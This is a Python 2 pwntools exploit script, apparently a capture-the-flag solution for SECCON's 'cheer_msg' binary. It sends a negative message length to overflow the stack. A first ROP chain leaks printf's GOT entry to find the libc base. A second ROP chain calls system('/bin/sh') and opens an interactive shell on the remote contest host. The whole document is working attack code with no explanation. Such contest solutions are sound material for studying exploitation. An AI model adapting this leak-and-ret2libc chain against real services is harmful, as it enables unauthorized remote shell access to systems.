#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

b = ELF("cheer_msg")
if DEBUG:
    libc = ELF("/lib/i386-linux-gnu/i686/cmov/libc.so.6")
else:
    libc = ELF("libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368")

logger = logging.getLogger()
logger.setLevel(logging.DEBUG) # set to INFO in release mode

###

if DEBUG:
    r = process("./cheer_msg")
else:
    r = remote("cheermsg.pwn.seccon.jp", 30527)

r.recvuntil("Message Length >> ")
r.sendline("-150")
r.recvuntil("Name >> ")
ROP = p32(b.symbols["printf"])
ROP += p32(b.symbols['main'])
ROP += p32(list(b.search("Thank you"))[0]) # "\nThank you %s!\nMessage : %s\n"
ROP += p32(b.symbols["got.printf"])
ROP += p32(b.symbols["got.printf"])
#gdb.attach(r)
r.sendline(ROP)
r.recvuntil("Thank you")
r.recvuntil("Thank you ")
leak = u32(r.recv(4))
log.info("leak: %x" % leak)

libcBase = leak - libc.symbols["printf"]
system = libc.symbols["system"] + libcBase
binsh = list(libc.search("/bin/sh"))[0] + libcBase
exit = libc.symbols["exit"] + libcBase
log.info("libcBase: " + hex(libcBase))
log.info("system: " + hex(system))
log.info("binsh: " + hex(binsh))
log.info("exit: " + hex(exit))

r.recvuntil("Message Length >> ")
r.sendline("-150")
r.recvuntil("Name >> ")
ROP = p32(system)
ROP += p32(exit)
ROP += p32(binsh)
r.sendline(ROP)

r.recvuntil("Message :")
r.recvline()
r.interactive()
